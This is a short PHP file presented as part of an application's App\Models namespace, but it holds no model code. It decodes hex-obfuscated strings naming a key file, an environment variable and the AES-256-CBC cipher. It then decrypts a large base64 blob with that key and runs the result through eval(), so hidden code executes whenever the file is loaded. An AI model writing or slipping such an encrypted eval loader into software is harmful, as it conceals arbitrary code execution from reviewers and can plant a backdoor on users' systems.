<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3MpurXbB8rgYhahBEzIb5A==');

$c=base64_decode(

'hULF72XvIQPm1ROmMGnJyxre5Lg8tMBUra3JXCESUCxDLb5rR+WpBrW70+PlNi0qgBHjtorGQVoR' .
'Kl3CI7d3j76YOWK69mxv0PvDiNOK2CIrx/eGgk5Ehkh/U6PgHFWzCpo2mQu60h1jJ/4vgT2Rjt8B' .
'2hzUrUw70sa60o+5NWReIhYe9cGjwrhEyOAWvsq2yfnVVLM5PKpT3CUC/rTzpCg9f88cUWh68g5Z' .
'bOEWmimUcJYtyCMxpq6TjOkANHpNsTaojmHEgMJpZTaYK24Ech1qyrAA8G9QasJW+ZJEK12Etoo8' .
'hRJxzKcUTOheWjpI0rIC85FcgLO4IcgOUASHAI2YtBH29BTLsoX+EmMZMnnYhWI06ZjDrN9qGMtu' .
'rLPS1TDnYQsz2m3tmReMfpYQYRVV5eMnpQGj1V2d/WA+cUba3GU1en7C98Yhx8fKU5M91MWFt5rL' .
'Z7NfRIQ9ni41sfyb4NvZyHYwYv7l0BQ8uWpsy1b9kYTtTR+kTfSJiFsFnTV+UMATc81Rzur31+bM' .
'dlp0Kebf/aWw+nWEqUqMRy913fXydbM9MD2XI0H3VZQhWhAawD9eSF+GePZr49hVNw+FPEw5v/7W' .
'7qlAbaX6zj+r6V/zSAl46DBFf6smrMNN1Gmw9vwakI4TtQdDOlMjNcfp9JJDjBoQzK4vCPL402aF' .
'D6sMFTFZ+ig5HJFQSgVHmsjAEtY9XhPpWGy5cqRSNWfY/rd8eBHRF7NU2/u0LFG/dW/Vuez0hLfw' .
'ABpxKSQufVsL7I/NeD588nJK5FWg8V+28NctAbgDT86DpJv4q0ZC6Gp16n+SNVAjaYMO7OIQ0qyl' .
'AejTJzA8KR5H7Z8nPY0G1lSNgUjSkK1QdqbD0f0Yug47VHRGEzb/p/tTiPEZ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

